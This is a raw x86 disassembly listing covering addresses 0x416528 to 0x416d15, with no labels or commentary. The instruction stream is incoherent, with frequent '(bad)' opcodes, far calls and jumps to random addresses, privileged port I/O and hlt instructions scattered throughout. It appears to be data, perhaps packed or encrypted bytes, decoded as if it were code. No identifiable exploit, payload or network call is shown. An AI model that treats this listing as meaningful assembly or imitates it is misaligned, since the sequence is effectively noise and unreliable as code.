  416528:	popa   
  416529:	call   0x4a6c:0xea1cd57
  416530:	mov    al,ds:0xecc834b
  416535:	mov    ds:0x1038b03c,al
  41653a:	fidiv  WORD PTR [ecx]
  41653c:	xor    edx,ebp
  41653e:	mov    esi,0x6e99e41a
  416543:	out    0x5f,al
  416545:	mov    ch,dl
  416547:	aas    
  416548:	xchg   edi,eax
  416549:	call   0x171a47f3
  41654e:	mov    WORD PTR [edx],?
  416550:	scas   al,BYTE PTR es:[edi]
  416551:	inc    esi
  416552:	repz adc eax,0xfa26482a
  416558:	mov    bh,BYTE PTR [ebx]
  41655a:	jae    0x4165d9
  41655c:	aas    
  41655d:	xchg   ebp,eax
  41655e:	mov    ecx,0xda3373db
  416563:	scas   eax,DWORD PTR es:[edi]
  416564:	jmp    FWORD PTR [ebx]
  416566:	loope  0x416500
  416568:	pop    ebp
  416569:	aaa    
  41656a:	push   es
  41656b:	clc    
  41656c:	mov    esi,ebx
  41656e:	or     al,0x19
  416570:	std    
  416571:	loopne 0x4165aa
  416573:	dec    esi
  416574:	mov    al,0x2
  416576:	inc    esp
  416577:	xor    al,0x2
  416579:	cmc    
  41657a:	pusha  
  41657b:	pop    edi
  41657c:	call   0x7a75:0x5edcb96d
  416583:	adc    eax,DWORD PTR [ebx-0x31]
  416586:	mov    bh,0x89
  416588:	xor    edi,ebx
  41658a:	retf   0xb9ee
  41658d:	jl     0x4165e8
  41658f:	xor    ebp,DWORD PTR [edx]
  416591:	push   esp
  416592:	adc    eax,esi
  416594:	xchg   DWORD PTR [esp+edi*1+0x6e9b990c],edx
  41659b:	xchg   bl,ah
  41659d:	or     BYTE PTR [ecx+0x7b6c2099],cl
  4165a3:	push   eax
  4165a4:	xchg   edi,eax
  4165a5:	iret   
  4165a6:	ret    0x4578
  4165a9:	xor    al,BYTE PTR [ebx+edx*8]
  4165ac:	sti    
  4165ad:	js     0x416616
  4165af:	pop    ss
  4165b0:	cmp    eax,DWORD PTR [edx+edx*2]
  4165b3:	shl    ah,1
  4165b5:	std    
  4165b6:	sub    ecx,0x7c
  4165b9:	inc    edx
  4165ba:	lods   eax,DWORD PTR ds:[esi]
  4165bb:	(bad)
  4165c0:	and    esp,DWORD PTR [ecx+esi*8+0x3f917a60]
  4165c7:	fsub   DWORD PTR [edx+edi*8]
  4165ca:	dec    edi
  4165cb:	push   ebx
  4165cc:	dec    ebp
  4165cd:	popa   
  4165ce:	pop    es
  4165cf:	es jl  0x41657b
  4165d2:	xchg   ebp,eax
  4165d3:	shr    BYTE PTR gs:[esi+0x2d],1
  4165d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165d8:	push   0x16
  4165da:	pushf  
  4165db:	pop    es
  4165dc:	imul   esp,DWORD PTR [edi-0x1c],0x80e7106
  4165e3:	lods   al,BYTE PTR ds:[esi]
  4165e4:	(bad)  
  4165e6:	sub    edx,DWORD PTR ds:0x4714e83e
  4165ec:	stos   BYTE PTR es:[edi],al
  4165ed:	mov    ah,0x7f
  4165ef:	mov    ebx,0x9b283e6b
  4165f4:	ins    DWORD PTR es:[edi],dx
  4165f5:	pop    edi
  4165f6:	adc    BYTE PTR [ecx+0x1b315cdc],0xab
  4165fd:	cld    
  4165fe:	pop    edi
  4165ff:	push   eax
  416601:	retf   0xd597
  416604:	sbb    BYTE PTR [edx-0x2a2124b],dh
  41660a:	mov    dh,0x5f
  41660c:	sahf   
  41660d:	push   ebp
  41660e:	nop
  41660f:	pop    ebx
  416610:	aam    0xf
  416612:	aad    0xd9
  416614:	neg    DWORD PTR [ecx+esi*2-0x47]
  416618:	inc    edi
  416619:	dec    edx
  41661a:	int3   
  41661b:	cmp    bl,0x6
  41661e:	cld    
  41661f:	add    DWORD PTR [edi+0x64],ebx
  416622:	mov    edi,0xe999ff40
  416627:	mov    edx,0xbe906123
  41662c:	imul   edi,esi,0x2b7afa35
  416632:	cmc    
  416633:	adc    dh,BYTE PTR [edx-0x1]
  416636:	test   DWORD PTR [edi],ebx
  416638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416639:	aam    0x2f
  41663b:	xchg   esp,eax
  41663c:	fwait
  41663d:	cmp    ch,BYTE PTR [ebp-0x1e]
  416640:	cmp    DWORD PTR [ebx],esi
  416642:	cmp    ebx,ebx
  416644:	jnp    0x4165d8
  416646:	push   es
  416647:	add    eax,0x9fda3c7f
  41664c:	sahf   
  41664d:	mov    ds:0x6fedfb68,eax
  416652:	retf   
  416653:	popf   
  416654:	cmp    cl,BYTE PTR [eax+0x23]
  416657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416658:	call   0x5e9a:0x57417752
  41665f:	test   BYTE PTR [ebp+0x52],cl
  416662:	xchg   edi,eax
  416663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416664:	enter  0x4936,0x15
  416668:	je     0x4165ee
  41666a:	jno    0x41669a
  41666c:	xchg   ecx,eax
  41666d:	push   eax
  41666e:	in     eax,0x9e
  416670:	std    
  416671:	inc    ecx
  416672:	cmp    ebp,ebx
  416674:	push   edx
  416675:	push   cs
  416676:	cmp    DWORD PTR [ebx+0x76],eax
  416679:	test   eax,0x4c62ae52
  41667e:	arpl   WORD PTR [edx-0x5b1b0ca9],sp
  416684:	dec    esp
  416685:	das    
  416686:	sub    ch,BYTE PTR [edx+0x2c5ca4fe]
  41668c:	test   BYTE PTR [edi+0x48],dl
  41668f:	cdq    
  416690:	xchg   edi,eax
  416691:	mov    ebp,0x731e02c5
  416696:	icebp  
  416697:	mul    BYTE PTR [ecx-0x18ad6d20]
  41669d:	jb     0x416635
  41669f:	or     BYTE PTR [edi+0x69710493],0xee
  4166a6:	push   esi
  4166a7:	data16 daa 
  4166a9:	xor    BYTE PTR [ecx],bl
  4166ab:	sub    bh,bh
  4166ad:	js     0x4166ec
  4166af:	add    dh,0xf8
  4166b2:	xchg   ecx,eax
  4166b3:	and    esi,DWORD PTR [edx]
  4166b5:	jns    0x416703
  4166b7:	call   0xf1fb:0x4d15c770
  4166be:	fst    DWORD PTR [ecx+0x48]
  4166c1:	add    BYTE PTR ss:[edi-0x1e8703e9],dh
  4166c8:	mov    edi,ebx
  4166ca:	and    DWORD PTR [edx],ebx
  4166cc:	dec    edi
  4166cd:	js     0x4166e9
  4166cf:	hlt    
  4166d0:	cmp    eax,0x925c0521
  4166d5:	dec    ecx
  4166d6:	outs   dx,DWORD PTR ds:[esi]
  4166d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166d8:	mov    DWORD PTR [eax+0x3263c066],edi
  4166de:	icebp  
  4166df:	hlt    
  4166e0:	push   0x50
  4166e2:	(bad)  
  4166e3:	cli    
  4166e4:	pop    edx
  4166e5:	and    eax,0xb2c497ea
  4166ea:	shr    DWORD PTR [esi],1
  4166ec:	fisttp DWORD PTR [ecx-0xd]
  4166ef:	hlt    
  4166f0:	ja     0x416704
  4166f2:	popf   
  4166f3:	jmp    0xe3d4:0xa784743a
  4166fa:	rcr    DWORD PTR [edx-0x20314b03],0xe6
  416701:	out    dx,al
  416702:	jbe    0x4166bc
  416704:	outs   dx,BYTE PTR ds:[esi]
  416705:	xor    ebp,ecx
  416707:	jns    0x416772
  416709:	and    al,0x56
  41670b:	mov    cs,ecx
  41670d:	sbb    eax,0x512e15bc
  416712:	pop    ebp
  416713:	adc    eax,0x3a8d4591
  416718:	clc    
  416719:	pop    esi
  41671a:	jo     0x41669e
  41671c:	hlt    
  41671d:	or     al,0x55
  41671f:	dec    BYTE PTR [edi+ecx*1+0x4566e0b3]
  416726:	je     0x4166d5
  416728:	jecxz  0x4166e5
  41672a:	inc    eax
  41672b:	mov    DWORD PTR [ebp+0x30],ebp
  41672e:	(bad)  
  41672f:	push   ds
  416730:	arpl   WORD PTR [ebx-0x64],dx
  416733:	xchg   ebp,eax
  416734:	or     esi,DWORD PTR [edx+0x44]
  416737:	mul    BYTE PTR [ebp+0x47]
  41673a:	and    BYTE PTR [edi-0xee005f7],ch
  416740:	mov    DWORD PTR [esi],esp
  416742:	sti    
  416743:	sbb    dl,BYTE PTR [eax]
  416745:	mov    ch,0x4f
  416747:	add    al,0xa2
  416749:	mov    ecx,0x5f5f9968
  41674e:	in     eax,0x4d
  416750:	(bad)  
  416751:	lds    edi,FWORD PTR cs:0xc3d19a
  416758:	ficomp DWORD PTR [edi-0x59]
  41675b:	dec    esi
  41675c:	adc    DWORD PTR cs:[ebx],esp
  41675f:	and    al,0x4e
  416761:	int    0x2c
  416763:	loope  0x4166f6
  416765:	xchg   DWORD PTR fs:[esp+edx*2-0x56],ebp
  41676a:	ss in  al,0x5d
  41676d:	fimul  DWORD PTR [edi+0x20fc38fc]
  416773:	mov    ebp,gs
  416775:	ret    
  416776:	fisubr WORD PTR [ebx]
  416778:	xchg   edx,eax
  416779:	retf   0xd263
  41677c:	ins    DWORD PTR es:[edi],dx
  41677d:	sbb    BYTE PTR [ebx+esi*1+0x36af9dbf],0xe6
  416785:	dec    ebx
  416787:	dec    ecx
  416788:	je     0x416724
  41678a:	arpl   WORD PTR [esi+0x7921cade],ax
  416790:	push   esp
  416791:	std    
  416792:	sub    DWORD PTR [ecx+edi*1],esp
  416795:	(bad)  
  416796:	shl    BYTE PTR ds:0xb858a7e1,1
  41679c:	and    al,0xd7
  41679e:	xor    al,0x4d
  4167a0:	xchg   BYTE PTR [esi-0x64],ch
  4167a3:	ds loope 0x416764
  4167a6:	fs adc eax,0xa823390c
  4167ac:	xor    eax,0x700fbe38
  4167b1:	sbb    dl,dh
  4167b3:	dec    esp
  4167b4:	test   BYTE PTR [ecx-0x46d0fef3],ch
  4167ba:	jmp    0x416781
  4167bc:	cmp    DWORD PTR [ebx],esi
  4167be:	js     0x41680b
  4167c0:	dec    ecx
  4167c1:	mov    gs,WORD PTR [ecx]
  4167c3:	inc    eax
  4167c4:	test   al,0x84
  4167c6:	cli    
  4167c7:	cmp    dh,BYTE PTR [ecx+0x79]
  4167ca:	out    0x37,al
  4167cc:	pusha  
  4167cd:	xor    al,0x1b
  4167cf:	ins    BYTE PTR es:[edi],dx
  4167d0:	ins    BYTE PTR es:[edi],dx
  4167d1:	adc    DWORD PTR [eax-0x5a],ebp
  4167d4:	and    eax,0xd9598693
  4167d9:	or     DWORD PTR [edx+eax*8+0x19f6427b],ebp
  4167e0:	xor    eax,0x633bc208
  4167e5:	or     dh,bl
  4167e7:	mov    esp,0xf5a24200
  4167ec:	in     al,0x8b
  4167ee:	retf   
  4167ef:	in     eax,dx
  4167f0:	lahf   
  4167f1:	call   DWORD PTR [edi]
  4167f3:	aaa    
  4167f4:	pusha  
  4167f5:	addr16 loop 0x4167c5
  4167f8:	scas   eax,DWORD PTR es:[edi]
  4167f9:	dec    ecx
  4167fa:	not    bh
  4167fc:	push   ss
  4167fd:	outs   dx,BYTE PTR ds:[esi]
  4167fe:	jns    0x416864
  416800:	psrlq  mm5,QWORD PTR [ebp+0x567c7967]
  416807:	push   eax
  416809:	int    0x3f
  41680b:	mov    ch,0x3
  41680d:	fist   WORD PTR [edi]
  41680f:	retf   
  416810:	pusha  
  416811:	sar    BYTE PTR [ebp+ebp*1-0xec7dae6],cl
  416818:	lds    edx,FWORD PTR [ebx-0x58258443]
  41681e:	cli    
  41681f:	rol    DWORD PTR [eax-0x41715dd6],cl
  416825:	jno    0x416808
  416827:	cld    
  416828:	xchg   esi,eax
  416829:	les    ecx,FWORD PTR [ebp-0x3f]
  41682c:	hlt    
  41682d:	pop    ecx
  41682e:	fiadd  DWORD PTR [eax]
  416830:	(bad)  [ebx-0x46]
  416833:	cli    
  416834:	inc    ebp
  416835:	(bad)  
  416836:	inc    eax
  416837:	sub    eax,0xe454dd2b
  41683c:	dec    edx
  41683d:	inc    edx
  41683e:	mov    cl,0xca
  416840:	in     al,0xb7
  416842:	fistp  DWORD PTR [edx]
  416844:	sub    al,BYTE PTR [eax]
  416846:	retf   0xfbf5
  416849:	(bad)  
  41684b:	jne    0x416825
  41684d:	not    al
  41684f:	cmp    esi,ebp
  416851:	xchg   ebp,eax
  416852:	push   ecx
  416853:	in     al,0x6a
  416855:	push   ss
  416856:	sbb    bl,al
  416858:	mov    eax,ds:0xa7d4e5e4
  41685d:	mov    edx,0x50880e51
  416862:	push   eax
  416863:	sub    eax,0xc7dc4c1e
  416868:	and    ecx,edi
  41686a:	stos   DWORD PTR es:[edi],eax
  41686b:	shl    BYTE PTR ds:[esi+0x43],cl
  41686f:	mov    cl,0xbe
  416871:	and    eax,0xcf1007dc
  416876:	push   edx
  416877:	mov    ecx,0x9d89d44
  41687c:	push   ebx
  41687d:	rcr    cl,cl
  41687f:	daa    
  416880:	xor    al,0xe0
  416882:	sub    al,0x8b
  416884:	jecxz  0x41689f
  416886:	inc    eax
  416887:	lock mov BYTE PTR [esi+0x4b623031],bl
  41688e:	(bad)  
  41688f:	jae    0x416851
  416891:	lods   eax,DWORD PTR ds:[esi]
  416892:	xor    eax,0x15f8508a
  416897:	add    cl,ch
  416899:	inc    esp
  41689a:	xchg   ebx,eax
  41689b:	mov    ebp,0xd91ea085
  4168a0:	push   ecx
  4168a1:	mov    DWORD PTR [edx],ecx
  4168a3:	loope  0x4168ed
  4168a5:	cdq    
  4168a6:	jae    0x4168ee
  4168a8:	add    al,0x2a
  4168aa:	mov    edx,0xcbb9e2dc
  4168af:	test   DWORD PTR [edx-0x2b],ebp
  4168b2:	mov    ebx,0xef5e7a9d
  4168b7:	mov    esi,0x547d4d20
  4168bc:	inc    edi
  4168bd:	cmp    bl,dl
  4168bf:	mov    cl,0xe5
  4168c1:	pop    eax
  4168c2:	and    DWORD PTR [esi+eiz*8+0x78b169d4],edx
  4168c9:	inc    ebp
  4168ca:	imul   edi,eax,0xabb8b6d9
  4168d0:	in     al,0xfc
  4168d2:	add    cl,BYTE PTR [ecx]
  4168d4:	js     0x416945
  4168d6:	mov    eax,DWORD PTR [edx+eiz*8]
  4168d9:	cld    
  4168da:	int    0x42
  4168dc:	jmp    0xe8f1:0x83d307cd
  4168e3:	push   ebx
  4168e4:	mov    ds:0x326f860e,eax
  4168e9:	fisubr WORD PTR [edx+0x3a]
  4168ec:	mov    esi,0x325b6c41
  4168f1:	cli    
  4168f2:	ins    DWORD PTR es:[edi],dx
  4168f3:	mov    ah,0xfe
  4168f5:	lock pop esp
  4168f7:	xlat   BYTE PTR ds:[ebx]
  4168f8:	int    0xad
  4168fa:	inc    esp
  4168fb:	lea    esp,[ebx-0x33715733]
  416901:	mov    BYTE PTR [bx+di+0x2d],0xc0
  416906:	inc    edx
  416907:	js     0x416979
  416909:	loope  0x41697a
  41690b:	jl     0x41697b
  41690d:	(bad)  
  41690e:	sub    al,0x81
  416910:	daa    
  416911:	cld    
  416912:	cmp    BYTE PTR [edx+0x49],cl
  416915:	inc    ebp
  416916:	data16 sbb BYTE PTR [ebx+0x50],0x39
  41691b:	icebp  
  41691c:	jp     0x416967
  41691e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41691f:	mov    esi,0xf06e40a8
  416924:	mov    edx,0x9bd4998e
  416929:	jne    0x416958
  41692b:	repz mov al,0x4e
  41692e:	into   
  41692f:	sub    al,BYTE PTR [eax-0x6b]
  416932:	cdq    
  416933:	inc    esp
  416934:	lds    ecx,FWORD PTR [eax]
  416936:	shl    BYTE PTR [ebp+0x4c],cl
  416939:	pop    edx
  41693a:	out    dx,eax
  41693b:	les    ebx,FWORD PTR [esi+0x6d9ed2d9]
  416941:	loope  0x416999
  416943:	nop
  416944:	out    0x25,al
  416946:	mov    cl,0x99
  416948:	push   cs
  416949:	or     dh,bh
  41694b:	sbb    eax,0x67d30049
  416950:	add    dh,cl
  416952:	add    al,0x34
  416954:	cdq    
  416955:	or     ebx,DWORD PTR [edx+0xc3f0716]
  41695b:	and    ch,bl
  41695d:	ins    BYTE PTR es:[edi],dx
  41695e:	pop    ds
  41695f:	cmp    esi,edx
  416961:	add    eax,0x41242ac5
  416966:	stos   DWORD PTR es:[edi],eax
  416967:	xor    eax,0x6a198652
  41696c:	daa    
  41696d:	push   es
  41696e:	pop    edx
  41696f:	mov    ecx,0xeba2b643
  416974:	fldenv [ebp+0x46]
  416977:	std    
  416978:	call   0x144e:0xffc63ce9
  41697f:	jo     0x416958
  416981:	xchg   BYTE PTR [ebp+0x3],ch
  416984:	cmp    bl,cl
  416986:	or     esi,edi
  416988:	inc    ebx
  416989:	call   FWORD PTR [esi+0x4c622222]
  41698f:	jb     0x41695d
  416991:	adc    eax,0x6e794e6a
  416996:	popa   
  416997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416998:	gs jecxz 0x416a18
  41699b:	ins    DWORD PTR es:[edi],dx
  41699c:	pop    es
  41699d:	xchg   esi,eax
  41699e:	repz and bh,BYTE PTR [edx-0x23]
  4169a2:	xor    BYTE PTR fs:[esi],ch
  4169a5:	mov    ebx,0xfbf0e631
  4169aa:	sub    BYTE PTR [eax+0x2c0f8486],bh
  4169b0:	jno    0x4169c5
  4169b2:	add    al,0xc1
  4169b4:	icebp  
  4169b5:	adc    esp,esp
  4169b7:	inc    ecx
  4169b8:	add    edx,DWORD PTR [ebx]
  4169ba:	adc    DWORD PTR [esi+0x3cc985bb],ecx
  4169c0:	in     al,0xbb
  4169c2:	adc    dh,BYTE PTR [edi]
  4169c4:	push   es
  4169c5:	push   0xfffffff1
  4169c7:	mov    ds:0xd17527b5,eax
  4169cc:	gs jmp 0x416988
  4169cf:	add    BYTE PTR [edx],dl
  4169d1:	fstp   DWORD PTR [esi-0x4]
  4169d4:	or     bl,BYTE PTR [ebx-0x65905c7b]
  4169da:	sub    BYTE PTR [eax+0x50],dl
  4169dd:	test   esi,0x81fcb410
  4169e3:	mov    BYTE PTR [ebp+eax*2+0x208ab085],bh
  4169ea:	dec    esp
  4169eb:	pushf  
  4169ec:	test   ebp,ebx
  4169ee:	and    dh,bh
  4169f0:	mov    bl,0x2d
  4169f2:	jecxz  0x416a38
  4169f4:	push   cs
  4169f5:	popf   
  4169f6:	mov    bh,0x94
  4169f8:	mov    al,0x5c
  4169fa:	adc    al,0xa5
  4169fc:	pop    ebx
  4169fd:	sub    dh,dh
  4169ff:	sar    BYTE PTR [eax+0x2dda904c],1
  416a05:	fcom   QWORD PTR [ecx-0x6a]
  416a08:	or     DWORD PTR [ebx-0x1d],ebp
  416a0b:	and    DWORD PTR [edi-0x1b],eax
  416a0e:	mov    ecx,0xb389736c
  416a13:	cs lock fcom st(1)
  416a17:	jecxz  0x4169f3
  416a19:	mov    eax,ds:0x8d297169
  416a1e:	rcl    DWORD PTR [eax+0x61de90e1],cl
  416a24:	add    edi,DWORD PTR [edx+0x1bffebe9]
  416a2a:	or     ebp,ecx
  416a2c:	sub    edi,DWORD PTR [eax+0x654f5f8a]
  416a32:	mov    ds:0x2714243a,al
  416a37:	std    
  416a38:	scas   eax,DWORD PTR es:[edi]
  416a39:	fwait
  416a3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a3b:	jmp    0xff89c9fa
  416a40:	inc    edi
  416a41:	add    edx,DWORD PTR [esi+0x5]
  416a44:	(bad)  
  416a45:	in     al,dx
  416a46:	cmp    al,0x58
  416a48:	sub    al,0x8f
  416a4a:	cmp    dh,BYTE PTR [edx-0x42]
  416a4d:	sbb    edx,ecx
  416a4f:	cmp    esp,DWORD PTR [edx+0x17d5160e]
  416a55:	and    DWORD PTR [ebp+0x1107a5c6],edi
  416a5b:	cmp    edx,DWORD PTR [edx]
  416a5d:	xor    al,0x3a
  416a5f:	and    DWORD PTR [eax-0x67],edi
  416a62:	jns    0x416a96
  416a64:	(bad)
  416a68:	aad    0x98
  416a6a:	inc    ebx
  416a6b:	push   cs
  416a6c:	pusha  
  416a6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a6e:	xor    BYTE PTR [edi],ah
  416a70:	jmp    0x6d610b81
  416a75:	add    edx,DWORD PTR [ebx-0x3d3ce27d]
  416a7b:	xor    cl,BYTE PTR [esi+0x45]
  416a7e:	jmp    0xac11:0xba18b880
  416a85:	mov    ebx,DWORD PTR [esi-0x7ca40e6c]
  416a8b:	mov    dl,0x9b
  416a8d:	dec    edi
  416a8e:	pop    ss
  416a8f:	xchg   ebp,eax
  416a90:	cmp    bl,0x31
  416a93:	mov    dh,bl
  416a95:	add    bh,BYTE PTR [ebx]
  416a97:	jae    0x416aad
  416a99:	sub    DWORD PTR [ebx-0x720a6ec0],ebx
  416a9f:	mov    al,0xa0
  416aa1:	fimul  WORD PTR [edi+0x10dc013f]
  416aa7:	out    0x7e,eax
  416aa9:	push   ds
  416aaa:	dec    ebp
  416aab:	call   0x9849927f
  416ab0:	mov    ch,0xc4
  416ab2:	mov    eax,ds:0xa32ce7eb
  416ab7:	adc    dl,BYTE PTR [edi+0x3]
  416aba:	add    eax,0x52047b45
  416abf:	ins    BYTE PTR es:[edi],dx
  416ac0:	shr    DWORD PTR es:[esi],1
  416ac3:	add    ch,ah
  416ac5:	iret   
  416ac6:	or     cl,BYTE PTR [ecx]
  416ac8:	pop    ss
  416ac9:	mov    edx,0xfe400794
  416ace:	xlat   BYTE PTR ds:[ebx]
  416acf:	jae    0x416abb
  416ad1:	cmp    BYTE PTR [edx+0x1d4fc50c],bl
  416ad7:	inc    edi
  416ad8:	retf   
  416ad9:	cmp    edx,DWORD PTR [ecx-0x27133ab3]
  416adf:	mov    eax,0x1bf797ec
  416ae4:	mov    esi,0x502f56aa
  416ae9:	in     al,dx
  416aea:	call   0xf6762893
  416aef:	into   
  416af0:	and    eax,0xa9c36830
  416af5:	inc    ebx
  416af6:	pop    esi
  416af7:	test   edi,eax
  416af9:	inc    edi
  416afa:	jb     0x416b76
  416afc:	fsub   DWORD PTR [edi]
  416afe:	cwde   
  416aff:	mov    ecx,0x6d5e75bf
  416b04:	fldenv [ebx-0x9c13d3d]
  416b0a:	fxch   st(5)
  416b0c:	aas    
  416b0d:	push   0x70d54af7
  416b12:	dec    esp
  416b13:	xchg   esp,eax
  416b14:	mov    esp,0xbdd03e5b
  416b19:	adc    cl,BYTE PTR [ebp+0x4913baae]
  416b1f:	int    0x75
  416b21:	cmp    BYTE PTR ds:0xf87aec65,bl
  416b27:	jmp    0x30ee:0x22080572
  416b2e:	or     edi,DWORD PTR [esi+ebx*2]
  416b31:	push   ebp
  416b32:	jle    0x416b6b
  416b34:	out    dx,eax
  416b35:	sub    al,0x56
  416b37:	cld    
  416b38:	add    al,0xaa
  416b3a:	loopne 0x416b59
  416b3c:	inc    eax
  416b3d:	repnz xchg ebp,eax
  416b3f:	or     ecx,DWORD PTR [esi+edx*4+0x78]
  416b43:	sub    DWORD PTR [edx-0x7cc06fe5],0xffffffdc
  416b4a:	enter  0xef9c,0x8
  416b4e:	mov    dl,0x1c
  416b50:	int3   
  416b51:	ret    0x6696
  416b54:	xchg   edi,eax
  416b55:	es gs retf 0xf192
  416b5a:	sub    al,0xfa
  416b5c:	xlat   BYTE PTR ds:[ebx]
  416b5d:	inc    ebx
  416b5e:	fs fst st(5)
  416b61:	out    0xdf,al
  416b63:	inc    ebx
  416b64:	neg    edx
  416b66:	jmp    0xa0ffe3f1
  416b6b:	push   ds
  416b6c:	dec    esp
  416b6d:	int    0xa2
  416b6f:	sub    dl,bh
  416b71:	data16 loope 0x416baf
  416b74:	jae    0x416b6a
  416b76:	inc    esp
  416b77:	cli    
  416b78:	or     eax,0xcd851cc6
  416b7d:	jmp    0x416bd3
  416b7f:	fistp  DWORD PTR [esi+ebx*1-0x48]
  416b83:	pop    edx
  416b84:	shl    DWORD PTR [ebx-0x13],cl
  416b87:	mov    edi,0x27489ebd
  416b8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b8d:	test   BYTE PTR [esp+eiz*2],cl
  416b90:	add    dl,BYTE PTR [esi-0x61]
  416b93:	cmp    edx,DWORD PTR [eax+0x6d65e042]
  416b99:	xor    ecx,esp
  416b9b:	pushf  
  416b9c:	shl    DWORD PTR [esi-0x597ac62b],cl
  416ba2:	lea    ecx,[esi-0x1b3107e]
  416ba8:	and    bh,dh
  416baa:	dec    ebp
  416bab:	sub    BYTE PTR [ecx-0x3c2fe415],ch
  416bb1:	call   0x5cabb24b
  416bb6:	bound  ebx,QWORD PTR [ecx]
  416bb8:	adc    esi,DWORD PTR [edx+eiz*8]
  416bbb:	jecxz  0x416c23
  416bbd:	jnp    0x416c12
  416bbf:	daa    
  416bc0:	add    bh,bh
  416bc2:	mov    ecx,0xaa89880f
  416bc7:	mov    bh,0xff
  416bc9:	lds    ebx,FWORD PTR [esi+0x64]
  416bcc:	cmp    DWORD PTR ds:0xb57bada1,esp
  416bd2:	mov    edx,0x94d1da6b
  416bd7:	call   0x661a1f8a
  416bdc:	jbe    0x416c0a
  416bde:	es int3 
  416be0:	mov    ch,0xe4
  416be2:	rcl    BYTE PTR [edi+0x2e],1
  416be5:	test   BYTE PTR [edx+eax*4-0x125f07f5],ah
  416bec:	in     al,dx
  416bed:	repnz fild QWORD PTR [edx]
  416bf0:	and    BYTE PTR [eax-0x151708e8],bh
  416bf6:	mov    dl,BYTE PTR [edx+0x2a]
  416bf9:	cmp    BYTE PTR [eax+edi*1+0x5d],bl
  416bfd:	out    0x9a,al
  416bff:	loop   0x416bcb
  416c01:	mov    al,0xc6
  416c03:	or     dl,bh
  416c05:	xchg   ebp,eax
  416c06:	rol    dh,cl
  416c08:	out    0xe7,al
  416c0a:	fcmovu st,st(1)
  416c0c:	jno    0x416bad
  416c0e:	repnz cmp DWORD PTR [ecx],ecx
  416c11:	fisttp DWORD PTR [edx+0x4a]
  416c14:	inc    esp
  416c15:	rol    BYTE PTR [ebx+0x6509c03a],cl
  416c1b:	scas   eax,DWORD PTR es:[edi]
  416c1c:	js     0x416c0f
  416c1e:	add    al,0x45
  416c20:	retf   
  416c21:	mov    DWORD PTR cs:[esi+0x3bb7d904],ecx
  416c28:	dec    ebp
  416c29:	clc    
  416c2a:	push   edx
  416c2b:	mov    ds:0x486eb992,al
  416c30:	sbb    ebx,DWORD PTR [edx-0x20]
  416c33:	and    cl,bl
  416c35:	cmp    al,0x9d
  416c37:	frstor [ecx-0x2552660a]
  416c3d:	daa    
  416c3e:	push   0xc
  416c40:	adc    al,0x19
  416c42:	cwde   
  416c43:	inc    esp
  416c44:	ret    
  416c45:	xor    BYTE PTR [esp+esi*2-0x57e6f59],ch
  416c4c:	loope  0x416c08
  416c4e:	adc    BYTE PTR [esi*8-0xebfd35d],bl
  416c55:	aaa    
  416c56:	sub    ah,al
  416c58:	mov    esp,DWORD PTR [edx+0x2]
  416c5b:	fs xor al,0x16
  416c5e:	or     bh,BYTE PTR [bp+si]
  416c61:	sti    
  416c62:	adc    eax,0x8ec76abb
  416c67:	and    ah,BYTE PTR [esi]
  416c69:	test   BYTE PTR [edx],cl
  416c6b:	retf   
  416c6c:	ror    DWORD PTR [ebx+0x645c9a3a],0x69
  416c73:	inc    edx
  416c74:	aad    0x53
  416c76:	fst    QWORD PTR [esi]
  416c78:	lea    edx,[ebx+edi*2-0xe]
  416c7c:	je     0x416c13
  416c7e:	mov    cl,0x13
  416c80:	push   ebx
  416c81:	jnp    0x416c03
  416c83:	lods   eax,DWORD PTR ds:[esi]
  416c84:	dec    ebx
  416c85:	ja     0x416c1c
  416c87:	jmp    0x416c0f
  416c89:	daa    
  416c8a:	add    DWORD PTR [ecx+0x668338f1],ebp
  416c90:	ficomp DWORD PTR [edx+0x6d3fba99]
  416c96:	pop    es
  416c97:	dec    edx
  416c98:	push   0xec1980e0
  416c9d:	js     0x416d02
  416c9f:	push   ecx
  416ca0:	loopne 0x416c8a
  416ca2:	jb     0x416c2e
  416ca4:	scas   al,BYTE PTR es:[edi]
  416ca5:	inc    eax
  416ca6:	dec    ecx
  416ca7:	pop    eax
  416ca8:	mov    WORD PTR [eax-0x4e],es
  416cab:	jg     0x416c8d
  416cad:	and    ecx,ecx
  416caf:	jp     0x416c85
  416cb1:	push   ss
  416cb2:	mov    ch,ch
  416cb4:	test   eax,0xc989ecd5
  416cb9:	cmp    eax,0x2e00c44d
  416cbe:	mov    ds:0xc75bdd84,eax
  416cc3:	inc    ebp
  416cc4:	xchg   bh,bh
  416cc6:	or     eax,DWORD PTR ds:0x3312d2ce
  416ccc:	popf   
  416ccd:	jmp    0xb089:0x4f986350
  416cd4:	inc    esp
  416cd5:	dec    edx
  416cd6:	sbb    DWORD PTR [ebp+0x41],0x2b
  416cda:	xor    DWORD PTR [ecx+ebx*4-0x19],ebx
  416cde:	std    
  416cdf:	xlat   BYTE PTR ds:[ebx]
  416ce0:	xlat   BYTE PTR ds:[ebx]
  416ce1:	stos   DWORD PTR es:[edi],eax
  416ce2:	imul   edx,ecx,0xfffffff2
  416ce5:	cli    
  416ce6:	leave  
  416ce7:	push   esp
  416ce8:	es inc edx
  416cea:	xlat   BYTE PTR ds:[ebx]
  416ceb:	(bad)  
  416cec:	fwait
  416ced:	cmp    eax,0xa81b6383
  416cf2:	test   DWORD PTR [eax],edi
  416cf4:	in     al,dx
  416cf5:	and    esp,DWORD PTR [ebx]
  416cf7:	arpl   WORD PTR [edx],si
  416cf9:	sar    dl,1
  416cfb:	push   ds
  416cfc:	sub    ebx,DWORD PTR [eax]
  416cfe:	sbb    al,0x8b
  416d00:	inc    ecx
  416d01:	xchg   edi,eax
  416d02:	jmp    0xc391:0x603c70c7
  416d09:	stos   DWORD PTR es:[edi],eax
  416d0a:	ficom  DWORD PTR [eax+0x38]
  416d0d:	test   eax,eax
  416d0f:	inc    edx
  416d10:	sahf   
  416d11:	fidivr WORD PTR [ecx-0x7b]
  416d14:	dec    ebx
  416d15:	popa   
